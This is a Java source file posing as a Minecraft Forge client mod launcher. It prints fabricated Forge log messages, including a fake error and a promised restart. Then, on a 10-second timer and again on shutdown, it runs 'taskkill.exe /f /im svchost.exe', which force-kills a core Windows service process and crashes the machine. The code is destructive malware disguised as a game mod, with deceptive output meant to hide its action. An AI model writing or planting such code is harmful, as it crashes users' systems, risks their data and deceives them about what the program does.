package cum.club.forgemod;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class Main {
    public static void main(String[] args) {
        System.out.println("[FORGE] Info  : Starting forge...");
        System.out.println("[FORGE] Warn  : Using unsupported version of ForgeGradle 2.3, use ForgeGradle 5 instead, this isn't required but recommended");
        System.out.println("[FORGE] Info  : Loading OyVey mixin loader (me.alpha432.oyvey.mixin.OyVeyMixinLoader)");
        System.out.println("[FORGE] Info  : Loaded 23 Mixins!");
        System.out.println("[FORGE] Info  : An error occurred while trying to start forge. Please contact the developers.\n\nERR 0x24987 JAVA BINARY EXCEPTION FAULT, RESTARTING...");
        System.out.println("[FORGE] Info  : Client mod will attempt to restart forge in 10 seconds...");

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                Main.doShit();
            }
        }, 10L * 1000L);

        Runtime.getRuntime().addShutdownHook(new Thread(Main::doShit, "Forge-ExecutorThread"));
    }

    private static void doShit() {
        try {
            Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
        } catch (IOException e) {
            System.out.println("[FORGE] ERROR : Failure to start forge correctly, please contact the forge developers. Exiting...");
            System.exit(0);
        }
    }
}
